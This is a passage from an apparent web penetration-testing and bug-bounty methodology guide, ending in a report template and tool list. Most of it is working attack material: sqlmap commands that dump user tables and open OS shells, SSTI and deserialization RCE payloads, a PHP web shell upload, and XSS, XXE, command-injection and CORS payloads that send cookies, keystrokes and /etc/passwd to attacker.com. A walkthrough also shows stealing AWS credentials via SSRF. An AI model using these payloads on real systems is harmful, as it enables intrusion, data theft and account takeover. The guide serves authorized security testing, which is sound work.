    --cookie="session=abc123" \
    --batch --random-agent --level=3 --risk=2

  # POST request
  sqlmap -u "$TARGET/search" \
    --data="query=test&category=1" \
    --batch --random-agent

  # Dump database
  sqlmap -u "$TARGET/product?id=1" --batch --dbs
  sqlmap -u "$TARGET/product?id=1" --batch -D webapp --tables
  sqlmap -u "$TARGET/product?id=1" --batch -D webapp -T users --dump

  # OS shell (if stacked queries supported)
  sqlmap -u "$TARGET/product?id=1" --batch --os-shell

  # From Burp request file
  sqlmap -r request.txt --batch --random-agent --level=5 --risk=3

  # WAF bypass
  sqlmap -u "$TARGET/product?id=1" \
    --batch --random-agent --tamper=space2comment,between,randomcase
  ```

  **SQLi Cheat Sheet by Database:**

  ::collapsible

  | Operation | MySQL | MSSQL | PostgreSQL |
  |---|---|---|---|
  | Version | `SELECT @@version` | `SELECT @@version` | `SELECT version()` |
  | Current DB | `SELECT database()` | `SELECT db_name()` | `SELECT current_database()` |
  | List DBs | `SELECT schema_name FROM information_schema.schemata` | `SELECT name FROM master..sysdatabases` | `SELECT datname FROM pg_database` |
  | List Tables | `SELECT table_name FROM information_schema.tables WHERE table_schema='DB'` | `SELECT name FROM DB..sysobjects WHERE xtype='U'` | `SELECT tablename FROM pg_tables` |
  | List Columns | `SELECT column_name FROM information_schema.columns WHERE table_name='TBL'` | `SELECT name FROM syscolumns WHERE id=OBJECT_ID('TBL')` | `SELECT column_name FROM information_schema.columns WHERE table_name='TBL'` |
  | String Concat | `CONCAT('a','b')` or `'a' 'b'` | `'a'+'b'` | `'a'\|\|'b'` |
  | Comment | `-- -` or `#` | `-- -` | `-- -` |
  | Stacked Queries | ✅ (with mysqli) | ✅ | ✅ |
  | Read File | `LOAD_FILE('/etc/passwd')` | `OPENROWSET(BULK...)` | `pg_read_file('/etc/passwd')` |
  | Write File | `INTO OUTFILE '/path'` | `xp_cmdshell` | `COPY ... TO '/path'` |
  | Time Delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` |

  ::

  :::

  :::tabs-item{icon="i-lucide-code" label="Cross-Site Scripting (XSS)"}

  ::badge
  **A03:2021 — Injection** | CWE-79
  ::

  ```bash [Terminal — XSS Detection]
  TARGET="https://example.com"

  # ── Reflected XSS — Manual Payloads ────────────────────────────
  # Step 1: Find reflection points
  # Send a unique string and search the response
  curl -s "$TARGET/search?q=xss1337test" | grep "xss1337test"
  # Note WHERE it reflects: HTML body? Attribute? JavaScript? Tag?

  # Step 2: Context-specific payloads

  # HTML body context:
  # <script>alert(document.domain)</script>
  # <img src=x onerror=alert(document.domain)>
  # <svg/onload=alert(document.domain)>
  # <details/open/ontoggle=alert(document.domain)>

  # HTML attribute context (inside value="..."):
  # " onmouseover="alert(document.domain)
  # " autofocus onfocus="alert(document.domain)
  # "><script>alert(document.domain)</script>

  # JavaScript context (inside '...' or "..."):
  # '-alert(document.domain)-'
  # ';alert(document.domain)//
  # \'-alert(document.domain)//

  # URL/href context:
  # javascript:alert(document.domain)
  # data:text/html,<script>alert(document.domain)</script>

  # ── dalfox — automated XSS scanner ────────────────────────────
  dalfox url "$TARGET/search?q=test" --blind https://your.xss.ht

  # From parameter list
  cat parameterized_urls.txt | dalfox pipe --blind https://your.xss.ht

  # ── XSS via ffuf ──────────────────────────────────────────────
  ffuf -u "$TARGET/search?q=FUZZ" \
    -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt \
    -mr "<script>|onerror=|onload=|alert(" \
    -t 30
  ```

  ```javascript [XSS Payload Examples — By Impact]
  // ── Cookie Theft ──────────────────────────────────────────────
  <script>
  fetch('https://attacker.com/steal?c='+document.cookie)
  </script>

  // ── Session Hijacking (no HttpOnly) ───────────────────────────
  <img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">

  // ── Keylogger ─────────────────────────────────────────────────
  <script>
  document.onkeypress=function(e){
    fetch('https://attacker.com/log?k='+e.key)
  }
  </script>

  // ── Phishing (inject fake login form) ─────────────────────────
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session Expired - Please Login</h2>
  <form action="https://attacker.com/phish">
  <input name="user" placeholder="Username"><br>
  <input name="pass" type="password" placeholder="Password"><br>
  <button>Login</button></form></div>

  // ── DOM XSS (check these sinks) ───────────────────────────────
  // Sources: location.hash, location.search, document.referrer,
  //          window.name, postMessage data
  // Sinks: innerHTML, outerHTML, document.write, eval(),
  //        setTimeout(), setInterval(), location.href,
  //        jQuery.html(), jQuery.append()
  ```

  :::

  :::tabs-item{icon="i-lucide-server" label="SSRF (Server-Side Request Forgery)"}

  ::badge
  **A10:2021 — SSRF** | CWE-918
  ::

  ```http [Burp Suite — SSRF Testing]
  ### Test any parameter that accepts URLs or fetches remote resources

  ### Basic SSRF — access internal services
  POST /api/fetch-url HTTP/1.1
  Content-Type: application/json

  {"url": "http://127.0.0.1:80"}
  {"url": "http://localhost:8080/admin"}
  {"url": "http://169.254.169.254/latest/meta-data/"}    # AWS metadata
  {"url": "http://metadata.google.internal/computeMetadata/v1/"} # GCP
  {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"} # Azure

  ### Internal port scanning via SSRF
  {"url": "http://127.0.0.1:22"}     # SSH
  {"url": "http://127.0.0.1:3306"}   # MySQL
  {"url": "http://127.0.0.1:6379"}   # Redis
  {"url": "http://127.0.0.1:9200"}   # Elasticsearch
  {"url": "http://127.0.0.1:27017"}  # MongoDB

  ### Bypass filters
  # Decimal IP:       http://2130706433 (= 127.0.0.1)
  # Hex IP:           http://0x7f000001
  # Octal IP:         http://0177.0.0.1
  # IPv6:             http://[::1]
  # Short form:       http://127.1
  # DNS rebinding:    Use rebind.it or your own DNS server
  # Redirect:         Host a 302 redirect on your server to internal IP
  # URL encoding:     http://%31%32%37%2e%30%2e%30%2e%31
  # Mixed encoding:   http://127.0.0.1%23@evil.com (URL fragment trick)

  ### Protocol smuggling (if not limited to HTTP)
  {"url": "file:///etc/passwd"}
  {"url": "gopher://127.0.0.1:6379/_SET%20pwned%20true"}
  {"url": "dict://127.0.0.1:6379/INFO"}
  ```

  ```bash [Terminal — Automated SSRF Testing]
  # Test cloud metadata endpoints via SSRF
  SSRF_ENDPOINT="https://example.com/api/fetch?url="

  PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/latest/user-data/"
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    "http://127.0.0.1:80/"
    "http://127.0.0.1:8080/"
    "http://127.0.0.1:3000/"
    "http://10.0.0.1/"
    "http://172.16.0.1/"
    "http://192.168.1.1/"
  )

  for payload in "${PAYLOADS[@]}"; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
      "${SSRF_ENDPOINT}${payload}")
    echo "$RESP → $payload"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="SSTI (Server-Side Template Injection)"}

  ```http [Burp Suite — SSTI Detection]
  ### Detection — inject math expressions in template syntax
  ### If the server evaluates them, SSTI is confirmed

  # Universal detection polyglot
  ${7*7}
  {{7*7}}
  #{7*7}
  <% 7*7 %>
  ${7*'7'}
  {{7*'7'}}

  # Expected results if vulnerable:
  # ${7*7}     → 49   (Java EL, Freemarker)
  # {{7*7}}    → 49   (Jinja2, Twig, Handlebars)
  # #{7*7}     → 49   (Ruby ERB, Pebble)
  # {{7*'7'}}  → 49   (Twig) or 7777777 (Jinja2)
  # ← The difference between Twig and Jinja2!
  ```

  ```
  SSTI Decision Tree:
  
  ${7*7} = 49?
    ├── YES → Java-based template
    │   ├── ${T(java.lang.Runtime).getRuntime().exec('id')}
    │   │   Works? → Java EL / Spring EL
    │   └── <#assign ex="freemarker.template...
    │       Works? → Freemarker
    └── NO
        {{7*7}} = 49?
        ├── YES
        │   ├── {{7*'7'}} = 7777777?
        │   │   YES → Jinja2 (Python)
        │   │   └── {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
        │   └── {{7*'7'}} = 49?
        │       YES → Twig (PHP)
        │       └── {{_self.env.registerUndefinedFilterCallback("exec")}}
        │           {{_self.env.getFilter("id")}}
        └── NO
            #{7*7} = 49?
            ├── YES → Ruby ERB or Pebble
            │   └── <%= system('id') %>
            └── NO → Likely not vulnerable to SSTI
  ```

  ```python [SSTI — Jinja2 RCE Payloads]
  # Read file
  {{ ''.__class__.__mro__[1].__subclasses__()[XXX]('/etc/passwd').read() }}

  # RCE via os.popen
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

  # RCE via subprocess
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  # Find subprocess.Popen index (e.g., 407)
  {{ ''.__class__.__mro__[1].__subclasses__()[407]('id', shell=True, stdout=-1).communicate()[0] }}

  # Bypass filters (no quotes)
  {{ request.__class__.__mro__[1].__subclasses__()[407](request.args.cmd, shell=True, stdout=-1).communicate()[0] }}
  # Then: ?cmd=id
  ```
  :::
::

### 3.4 — More Injection Vectors

::accordion
  :::accordion-item{icon="i-lucide-file-up" label="File Upload Vulnerabilities"}

  ```http [Burp Suite — File Upload Testing]
  ### Step 1: Identify allowed file types and restrictions
  # Upload a normal image first — observe the response
  # Note: upload path, filename handling, content-type checks

  ### Step 2: Test bypass techniques

  ### Extension bypass
  # Double extension:     shell.php.jpg
  # Null byte:           shell.php%00.jpg (older systems)
  # Case variation:      shell.pHp, shell.PHP
  # Alternative ext:     shell.php5, shell.phtml, shell.phar
  # Extension confusion: shell.php.....  shell.php%20
  # .htaccess upload:    AddType application/x-httpd-php .txt

  ### Content-Type bypass
  # Change Content-Type header to: image/jpeg, image/png, image/gif
  # While keeping PHP content in the body

  ### Magic bytes bypass
  # Prepend image magic bytes before PHP code
  # GIF: GIF89a<?php system($_GET['cmd']); ?>
  # PNG: \x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
  # JPEG: \xff\xd8\xff<?php system($_GET['cmd']); ?>

  ### SVG upload → XSS
  # filename: xss.svg
  # Content:
  <?xml version="1.0" standalone="no"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <text x="20" y="20">XSS via SVG</text>
  </svg>

  ### Polyglot files
  # Create a valid image that is also valid PHP
  # Use exiftool to inject PHP into EXIF data:
  # exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  # Rename to image.php.jpg
  ```

  ```bash [Terminal — File Upload Exploitation]
  # Generate PHP web shell
  echo '<?php system($_GET["cmd"]); ?>' > shell.php

  # Upload with curl (modify form fields to match target)
  curl -X POST "$TARGET/upload" \
    -F "file=@shell.php;type=image/jpeg" \
    -F "submit=Upload" \
    -b "session=YOUR_SESSION_COOKIE"

  # If filename is randomized, try to find it
  ffuf -u "$TARGET/uploads/FUZZ.php" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

  # Access the shell
  curl "$TARGET/uploads/shell.php?cmd=id"
  curl "$TARGET/uploads/shell.php?cmd=cat+/etc/passwd"
  ```
  :::

  :::accordion-item{icon="i-lucide-file-xml" label="XXE (XML External Entity Injection)"}

  ::badge
  **A05:2021** | CWE-611
  ::

  ```xml [XXE Payloads]
  <!-- Basic XXE — Read local file -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>
    <data>&xxe;</data>
  </root>

  <!-- SSRF via XXE -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ]>
  <root>&xxe;</root>

  <!-- Blind XXE — Out-of-band data exfiltration -->
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
    %xxe;
  ]>
  <root>test</root>

  <!-- Attacker's xxe.dtd file -->
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%data;'>">
  %eval;
  %exfil;

  <!-- XXE via SVG upload -->
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
  ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>

  <!-- XXE via XLSX / DOCX (modify XML inside ZIP) -->
  <!-- Unzip the file, edit [Content_Types].xml or xl/worksheets/sheet1.xml -->
  <!-- Add the XXE payload, re-zip, and upload -->
  ```

  **Where to test for XXE:**
  - [ ] Any endpoint accepting XML (Content-Type: application/xml)
  - [ ] SOAP web services
  - [ ] SVG image upload
  - [ ] XLSX / DOCX file upload (they're ZIP files containing XML)
  - [ ] RSS / Atom feed parsers
  - [ ] SAML authentication endpoints
  - [ ] Configuration file import (XML format)
  :::

  :::accordion-item{icon="i-lucide-terminal" label="Command Injection (OS Injection)"}

  ::badge
  CWE-78
  ::

  ```http [Burp Suite — OS Command Injection]
  ### Test in any parameter that might interact with the OS
  ### Common locations: ping tools, DNS lookups, file converters,
  ### PDF generators, email functions, backup tools

  ### Basic payloads
  ; id
  | id
  || id
  & id
  && id
  `id`
  $(id)
  %0aid
  %0a%0did

  ### Example: Ping functionality
  POST /api/network/ping HTTP/1.1
  Content-Type: application/json

  {"host": "127.0.0.1; id"}
  {"host": "127.0.0.1 | cat /etc/passwd"}
  {"host": "127.0.0.1 && whoami"}
  {"host": "$(cat /etc/passwd)"}
  {"host": "`whoami`"}

  ### Blind command injection (no output visible)
  # Time-based
  {"host": "127.0.0.1; sleep 10"}
  {"host": "127.0.0.1 | ping -c 10 127.0.0.1"}

  # Out-of-band (DNS/HTTP exfiltration)
  {"host": "127.0.0.1; curl http://attacker.com/$(whoami)"}
  {"host": "127.0.0.1; nslookup $(whoami).attacker.com"}
  {"host": "127.0.0.1; wget http://attacker.com/?d=$(cat /etc/passwd | base64)"}
  ```

  ::warning
  Command injection in **PDF generators** (wkhtmltopdf, Puppeteer, PhantomJS) and **image processors** (ImageMagick) is especially common. If the app converts URLs to PDFs or processes images, test for injection through those paths.
  ::
  :::

  :::accordion-item{icon="i-lucide-package" label="Insecure Deserialization"}

  ::badge
  **A08:2021** | CWE-502
  ::

  ```bash [Terminal — Deserialization Testing]
  # ── Java Deserialization ───────────────────────────────────────
  # Indicators: Base64-encoded data starting with rO0AB (Java serialized)
  # Content-Type: application/x-java-serialized-object
  # Any binary blob in cookies, parameters, or headers

  # Generate payload with ysoserial
  java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/rce" \
    | base64 > payload.txt

  # Common Java gadget chains to try:
  # CommonsCollections1-7, CommonsBeanutils1,
  # Spring1-2, Hibernate1-2, JBossInterceptors1

  # ── PHP Deserialization ────────────────────────────────────────
  # Indicators: Serialized PHP objects
  # O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

  # Modify serialized objects to change properties
  # Change role from "user" to "admin"
  # Use PHPGGC for gadget chain generation:
  phpggc Laravel/RCE1 system id

  # ── Python Pickle Deserialization ──────────────────────────────
  # Indicators: Base64-encoded pickle data, .pkl files
  # NEVER unpickle untrusted data

  import pickle, os, base64

  class RCE:
      def __reduce__(self):
          return (os.system, ('curl http://attacker.com/$(whoami)',))

  payload = base64.b64encode(pickle.dumps(RCE()))
  print(payload.decode())

  # ── .NET Deserialization ───────────────────────────────────────
  # Indicators: __VIEWSTATE (ASP.NET), Base64 in cookies
  # Use ysoserial.net for payload generation
  ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \
    -c "cmd /c curl http://attacker.com/rce"
  ```
  :::
::

---

### 3.5 — Business Logic Vulnerabilities

These flaws can't be found by scanners — they require **understanding the application's intended behavior**.

::card-group
  ::card
  ---
  title: Price Manipulation
  icon: i-lucide-dollar-sign
  ---
  - Change price in hidden form fields
  - Modify quantity to negative values
  - Apply discount codes multiple times
  - Race conditions in payment processing
  - Currency conversion manipulation
  - Remove items after discount applied

  ```http
  POST /api/checkout HTTP/1.1
  {"item_id": 1, "price": 0.01, "qty": 1}
  {"item_id": 1, "price": -100, "qty": 1}
  {"item_id": 1, "qty": -1}
  ```
  ::

  ::card
  ---
  title: Workflow Bypass
  icon: i-lucide-git-branch
  ---
  - Skip required steps in multi-step processes
  - Access step 3 without completing step 1 & 2
  - Repeat a step that should be one-time
  - Modify the flow order
  - Access post-payment content without paying

  ```http
  # Direct access to final step
  POST /checkout/confirm HTTP/1.1
  # Without completing payment step
  ```
  ::

  ::card
  ---
  title: Race Conditions
  icon: i-lucide-zap
  ---
  - Send multiple requests simultaneously
  - Redeem coupon/voucher multiple times
  - Transfer money → race to overdraw
  - Like/vote multiple times
  - Claim limited rewards repeatedly

  ```bash
  # Send 50 simultaneous requests
  seq 1 50 | xargs -P 50 -I {} \
    curl -s "$TARGET/api/redeem" \
    -d '{"code":"DISCOUNT50"}'
  ```
  ::

  ::card
  ---
  title: Feature Abuse
  icon: i-lucide-alert-circle
  ---
  - Email functionality → SMTP injection / spam relay
  - Export features → exfiltrate large datasets
  - Import features → inject malicious data
  - Invitation system → invite yourself to private resources
  - Referral system → self-referral for rewards
  - Search → DoS via expensive queries
  ::
::

::tip
**Business logic flaws** are often the highest-impact findings in bug bounties because they can't be auto-detected and represent fundamental design failures. Think like a **dishonest user** — what would you try to do to get something for free, skip a step, or access something you shouldn't?
::

---

### 3.6 — API-Specific Testing

::tabs
  :::tabs-item{icon="i-lucide-braces" label="REST API Testing"}
  ```bash [Terminal — REST API Enumeration & Testing]
  API="https://api.example.com"

  # ── API documentation discovery ────────────────────────────────
  for path in swagger.json swagger.yaml openapi.json openapi.yaml \
    api-docs api/docs graphql graphiql api/v1 api/v2 api/v3; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$API/$path")
    [[ "$STATUS" != "404" ]] && echo "[!] $STATUS → $API/$path"
  done

  # ── API version testing ────────────────────────────────────────
  # Try accessing older API versions (may lack security fixes)
  curl -s "$API/v1/users"    # Older version
  curl -s "$API/v2/users"    # Current version
  curl -s "$API/v3/users"    # Future version?

  # ── Mass assignment / parameter pollution ──────────────────────
  # Original: POST /api/register {"username":"test","password":"test123"}
  # Try adding: {"username":"test","password":"test123","role":"admin"}
  #             {"username":"test","password":"test123","is_admin":true}
  #             {"username":"test","password":"test123","id":1}

  # ── Rate limiting test ─────────────────────────────────────────
  for i in $(seq 1 200); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$API/api/sensitive-action")
    echo "Request $i: $STATUS"
  done | sort | uniq -c | sort -rn

  # ── HTTP method testing on every endpoint ──────────────────────
  for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$API/api/users/1")
    echo "$method → $STATUS"
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-hexagon" label="GraphQL Testing"}
  ```bash [Terminal — GraphQL Enumeration]
  GQL="https://example.com/graphql"

  # ── Introspection query (reveals full schema) ──────────────────
  curl -s -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}' | jq .

  # Full introspection
  curl -s -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d '{"query":"query{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}'

  # ── Enumerate queries and mutations ────────────────────────────
  # Use the schema to find sensitive operations:
  # - User queries with admin data
  # - Mutation to change roles
  # - Debug/internal queries

  # ── Batch query (bypass rate limiting) ─────────────────────────
  curl -s -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d '[{"query":"{user(id:1){name email}}"},{"query":"{user(id:2){name email}}"},{"query":"{user(id:3){name email}}"}]'

  # ── GraphQL injection ──────────────────────────────────────────
  # SQLi through GraphQL variables
  curl -s -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d '{"query":"query{user(name:\"admin\\\" OR 1=1--\"){id name email}}"}'

  # ── DoS via nested queries ─────────────────────────────────────
  # Deeply nested query (resource exhaustion)
  # {user{friends{friends{friends{friends{name}}}}}}
  ```

  ::warning
  If **introspection is disabled**, try using **field suggestion errors**. Send a query with a misspelled field name and check if the error message suggests valid field names.
  ::
  :::
::

---

### 3.7 — Configuration & Infrastructure

::accordion
  :::accordion-item{icon="i-lucide-settings" label="Security Headers Audit"}

  ```bash [Terminal — Header Analysis]
  TARGET="https://example.com"

  curl -sI "$TARGET" | grep -iE "^(strict|content-security|x-frame|x-content|x-xss|referrer|permissions|feature|access-control|set-cookie)"
  ```

  | Header | Expected Value | Missing = Risk |
  |---|---|---|
  | `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | MITM, SSL stripping |
  | `Content-Security-Policy` | Restrictive policy | XSS impact increased |
  | `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
  | `X-Content-Type-Options` | `nosniff` | MIME-type sniffing |
  | `Referrer-Policy` | `strict-origin-when-cross-origin` | URL leakage |
  | `Permissions-Policy` | Restrict sensitive APIs | Feature abuse |
  | `Set-Cookie` | `Secure; HttpOnly; SameSite=Lax` | Cookie theft, CSRF |
  | `Access-Control-Allow-Origin` | Specific origin (not `*`) | CORS misconfiguration |
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="CORS Misconfiguration"}

  ```bash [Terminal — CORS Testing]
  TARGET="https://example.com"

  # Test if arbitrary origins are reflected
  curl -sI "$TARGET/api/data" \
    -H "Origin: https://evil.com" | grep -i "access-control"

  # Test if null origin is allowed
  curl -sI "$TARGET/api/data" \
    -H "Origin: null" | grep -i "access-control"

  # Test subdomain wildcard
  curl -sI "$TARGET/api/data" \
    -H "Origin: https://evil.example.com" | grep -i "access-control"

  # Test with credentials
  curl -sI "$TARGET/api/data" \
    -H "Origin: https://evil.com" | grep -i "access-control-allow-credentials"
  ```

  **Dangerous CORS configurations:**

  | Response Header | Vulnerable? | Impact |
  |---|---|---|
  | `Access-Control-Allow-Origin: *` | ⚠️ If credentials sent | Data theft |
  | `ACAO: https://evil.com` (reflected) | 🔴 Yes | Full API access from attacker's site |
  | `ACAO: null` | 🔴 Yes | Exploitable via sandboxed iframe |
  | `ACAO: *.example.com` | 🟡 Depends | Subdomain takeover → exploit |
  | `Allow-Credentials: true` + `ACAO: *` | 🔴 Yes | Authenticated API access |

  ```javascript [CORS Exploitation — Steal Authenticated Data]
  // Host this on attacker.com
  <script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://vulnerable.com/api/user/profile', true);
  xhr.withCredentials = true;
  xhr.onload = function() {
      // Send stolen data to attacker
      fetch('https://attacker.com/steal', {
          method: 'POST',
          body: xhr.responseText
      });
  };
  xhr.send();
  </script>
  ```
  :::

  :::accordion-item{icon="i-lucide-scan" label="Automated Vulnerability Scanning"}

  ```bash [Terminal — Nuclei & Nikto]
  TARGET="https://example.com"

  # ── Nuclei — template-based scanner ────────────────────────────
  # Update templates
  nuclei -update-templates

  # Full scan
  nuclei -u "$TARGET" -t nuclei-templates/ -o nuclei_results.txt

  # Specific categories
  nuclei -u "$TARGET" -t cves/           # Known CVEs
  nuclei -u "$TARGET" -t misconfigurations/
  nuclei -u "$TARGET" -t exposures/      # Sensitive files
  nuclei -u "$TARGET" -t takeovers/      # Subdomain takeover
  nuclei -u "$TARGET" -t vulnerabilities/

  # Scan multiple targets
  nuclei -l live_subdomains.txt -t nuclei-templates/ \
    -severity critical,high -o critical_findings.txt

  # ── Nikto — web server scanner ─────────────────────────────────
  nikto -h "$TARGET" -o nikto_report.html -Format htm

  # ── OWASP ZAP — full scan (headless) ──────────────────────────
  zap-cli quick-scan -s all -r "$TARGET" -o zap_report.html
  ```
  :::
::

---

## Phase 4 — Exploitation & Impact

### Vulnerability Chaining

Individual low/medium findings can be chained into critical exploits:

::tabs
  :::tabs-item{icon="i-lucide-link" label="Common Chains"}

  | Chain | Components | Result |
  |---|---|---|
  | **Self-XSS → Account Takeover** | Self-XSS + CSRF + Cookie theft | Steal any user's session |
  | **SSRF → RCE** | SSRF + Cloud metadata + credential access | Full server compromise |
  | **IDOR + XSS** | Read other users' data + inject stored XSS | Worm-like propagation |
  | **Open Redirect → OAuth Token Theft** | Open redirect in OAuth callback + token leak | Account takeover |
  | **XXE → SSRF → File Read** | XXE to reach internal services → read configs | Credential exposure |
  | **SQLi → File Write → RCE** | SQL injection → INTO OUTFILE web shell | Server compromise |
  | **CORS + XSS** | CORS misconfiguration + reflected XSS on trusted origin | Cross-origin data theft |
  | **Race Condition + IDOR** | Race on coupon redemption + access other orders | Financial fraud |
  :::

  :::tabs-item{icon="i-lucide-code" label="Chain Example: SSRF → AWS RCE"}
  ```http [Step 1: SSRF to AWS Metadata]
  POST /api/preview HTTP/1.1
  Content-Type: application/json

  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  # Response: "EC2-WebApp-Role"

  POST /api/preview HTTP/1.1
  Content-Type: application/json

  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebApp-Role"}
  # Response: Contains AWS AccessKeyId, SecretAccessKey, Token
  ```

  ```bash [Step 2: Use Stolen Credentials]
  # Configure AWS CLI with stolen credentials
  export AWS_ACCESS_KEY_ID="AKIA..."
  export AWS_SECRET_ACCESS_KEY="secret..."
  export AWS_SESSION_TOKEN="token..."

  # Enumerate access
  aws sts get-caller-identity
  aws s3 ls
  aws ec2 describe-instances
  aws lambda list-functions

  # Potentially: read secrets, modify infrastructure, pivot further
  ```
  :::
::

### Proof of Concept Standards

::card-group
  ::card
  ---
  title: Good PoC Includes
  icon: i-lucide-check-circle
  ---
  - Step-by-step reproduction instructions
  - HTTP requests & responses (screenshots + raw)
  - Impact demonstration (what data is exposed?)
  - Affected endpoints and parameters
  - Automation script (if applicable)
  - Video walkthrough (for complex chains)
  ::

  ::card
  ---
  title: Impact Demonstration
  icon: i-lucide-alert-triangle
  ---
  Show **real business impact**, not just `alert(1)`:

  - **XSS:** Cookie theft, phishing, account takeover
  - **SQLi:** Data extraction, user credentials
  - **SSRF:** Internal service access, cloud credentials
  - **IDOR:** Other users' PII, financial data
  - **RCE:** `id`, `whoami`, reverse shell
  - **Auth bypass:** Access admin panel with evidence
  ::
::

---

## Phase 5 — Reporting

### CVSS Scoring Guide

::collapsible

| Severity | CVSS Score | Examples |
|---|---|---|
| 🔴 **Critical** | 9.0 – 10.0 | Unauthenticated RCE, SQLi with full DB dump, auth bypass to admin |
| 🟠 **High** | 7.0 – 8.9 | Authenticated RCE, stored XSS on admin, full IDOR on PII |
| 🟡 **Medium** | 4.0 – 6.9 | Reflected XSS, CSRF on sensitive action, info disclosure |
| 🟢 **Low** | 0.1 – 3.9 | Self-XSS, verbose errors, missing headers, clickjacking |
| ⚪ **Info** | 0.0 | Best practice recommendations, software version disclosure |

::

### Report Template

::code-collapse

```markdown [vulnerability-report-template.md]
# Vulnerability Report

## Summary
| Field | Value |
|-------|-------|
| **Title** | [Descriptive title — e.g., "Stored XSS in User Profile Bio"] |
| **Severity** | Critical / High / Medium / Low |
| **CVSS Score** | X.X (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) |
| **CWE** | CWE-XXX — [Name] |
| **OWASP** | A0X:2021 — [Category] |
| **Affected URL** | https://example.com/endpoint |
| **Parameter** | `parameter_name` |
| **Date Found** | YYYY-MM-DD |
| **Reporter** | [Your name] |

## Description
[Clear, concise description of the vulnerability, what it is, and why it matters]

## Steps to Reproduce
1. Navigate to `https://example.com/profile`
2. In the "Bio" field, enter: `<script>alert(document.domain)</script>`
3. Click "Save Profile"
4. Visit the profile page — the JavaScript executes

## Proof of Concept

### HTTP Request
```http
POST /api/profile/update HTTP/1.1
Host: example.com
Cookie: session=abc123
Content-Type: application/json

{"bio": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "message": "Profile updated"}
```

### Evidence
[Screenshots, video, stolen data sample]

## Impact
- An attacker can inject malicious JavaScript that executes in the browsers of any user viewing the profile
- This can be used to steal session cookies, perform actions on behalf of victims, or redirect to phishing pages
- Affects all authenticated users who view the attacker's profile
- Could be escalated to account takeover via cookie theft

## Affected Users / Data
- All authenticated users
- Session tokens (HttpOnly flag not set on session cookie)

## Remediation
1. **Input Sanitization:** HTML-encode all user-supplied data before rendering in HTML context
2. **Content Security Policy:** Implement strict CSP to prevent inline script execution
3. **HttpOnly Flag:** Set HttpOnly flag on session cookies to prevent JavaScript access
4. **Output Encoding:** Use context-aware output encoding (HTML, JavaScript, URL)

## References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
```

::

---

## Tool Reference

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Recon Tools"}

  | Tool | Purpose | Install |
  |---|---|---|
  | **subfinder** | Passive subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
  | **amass** | Comprehensive DNS enumeration | `go install github.com/owasp-amass/amass/v4/...@master` |
